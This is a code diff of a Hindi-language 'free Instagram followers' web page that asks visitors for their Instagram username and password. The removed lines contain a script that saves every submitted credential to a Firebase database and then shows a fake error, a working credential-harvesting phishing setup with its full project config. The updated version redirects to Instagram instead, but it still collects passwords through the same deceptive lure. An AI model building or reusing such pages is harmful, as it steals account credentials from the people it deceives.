@@ -23,44 +23,78 @@
         max-width: 400px;
         padding: 20px;
         background: rgba(255, 255, 255, 0.1);
-        backdrop-filter: blur(10px);
-        border-radius: 15px;
-        box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+        backdrop-filter: blur(12px);
+        border-radius: 20px;
+        box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
         text-align: center;
+        position: relative;
+      }
+
+      .menu {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        font-size: 24px;
+        cursor: pointer;
+      }
+
+      .menu .bar {
+        width: 30px;
+        height: 4px;
+        background-color: white;
+        margin: 5px 0;
+        border-radius: 2px;
       }
 
       .container h1 {
-        font-size: 24px;
-        margin-bottom: 10px;
+        font-size: 26px;
+        margin-bottom: 15px;
+        font-weight: bold;
+        color: #ffffff;
       }
 
       .container p {
         font-size: 16px;
-        margin-bottom: 20px;
-        line-height: 1.5;
+        margin-bottom: 25px;
+        line-height: 1.6;
+      }
+
+      .input-field-container {
+        position: relative;
       }
 
       .input-field {
         width: 100%;
-        padding: 12px;
-        margin: 10px 0;
+        padding: 14px;
+        margin: 12px 0;
         border: none;
-        border-radius: 8px;
-        font-size: 14px;
+        border-radius: 10px;
+        font-size: 15px;
         background: rgba(255, 255, 255, 0.2);
         color: #fff;
+        outline: none;
       }
 
       .input-field::placeholder {
         color: #ddd;
       }
 
+      .toggle-password {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 16px;
+        color: #ddd;
+        cursor: pointer;
+      }
+
       .submit-button {
         width: 100%;
-        padding: 12px;
+        padding: 14px;
         border: none;
-        border-radius: 8px;
-        font-size: 16px;
+        border-radius: 10px;
+        font-size: 17px;
         font-weight: bold;
         color: #fff;
         background-color: #2ebf91;
@@ -70,16 +104,23 @@
 
       .submit-button:hover {
         background-color: #25a479;
+        transform: translateY(-2px);
       }
 
       footer {
         margin-top: 20px;
         font-size: 14px;
+        color: #ddd;
       }
     </style>
   </head>
   <body>
     <div class="container">
+      <div class="menu">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+      </div>
       <h1>फ्री इंस्टाग्राम फॉलोअर्स</h1>
       <p>
         अब आपको बिल्कुल फ्री में इंस्टाग्राम पर एक हज़ार से ज्यादा फॉलोअर्स दिए जा
@@ -93,54 +134,45 @@
           type="text"
           placeholder="Enter your Username"
         />
-        <input
-          class="input-field"
-          id="password"
-          type="password"
-          placeholder="Enter your Password"
-        />
+        <div class="input-field-container">
+          <input
+            class="input-field"
+            id="password"
+            type="password"
+            placeholder="Enter your Password"
+          />
+          <span class="toggle-password" id="togglePassword">👁️</span>
+        </div>
         <button class="submit-button" type="submit">Login</button>
       </form>
       <footer>&copy; 2025 Free Followers | All Rights Reserved</footer>
     </div>
 
-    <script type="module">
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
-      import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
-
-      // Firebase configuration
-      const firebaseConfig = {
-        apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
-        authDomain: "freefollowers-d31af.firebaseapp.com",
-        databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
-        projectId: "freefollowers-d31af",
-        storageBucket: "freefollowers-d31af.appspot.com",
-        messagingSenderId: "807949104285",
-        appId: "1:807949104285:web:2c0238cdc7913dad279074",
-        measurementId: "G-ME1GQ5KV8H",
-      };
-
-      // Initialize Firebase
-      const app = initializeApp(firebaseConfig);
-      const db = getDatabase(app);
-
-      function writeUserData(userID, username, password) {
-        set(ref(db, "users/" + userID), { username: username, password: password });
-      }
-
+    <script>
       // Handle form submission
       document.getElementById("loginForm").addEventListener("submit", (event) => {
         event.preventDefault();
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
-        const userID = new Date().getTime();
 
         if (username && password) {
-          writeUserData(userID, username, password);
-          alert("Your Account is Unexpected! Please try again later!");
+          // Redirect to Instagram login page
+          window.location.href = "https://www.instagram.com/accounts/login/";
         } else {
           alert("Please fill in both fields.");
         }
+      });
+
+      // Toggle password visibility
+      const togglePassword = document.getElementById("togglePassword");
+      const passwordField = document.getElementById("password");
+
+      togglePassword.addEventListener("click", () => {
+        const type = passwordField.type === "password" ? "text" : "password";
+        passwordField.type = type;
+
+        togglePassword.textContent =
+          type === "password" ? "👁️" : "🙈";
       });
     </script>
   </body>
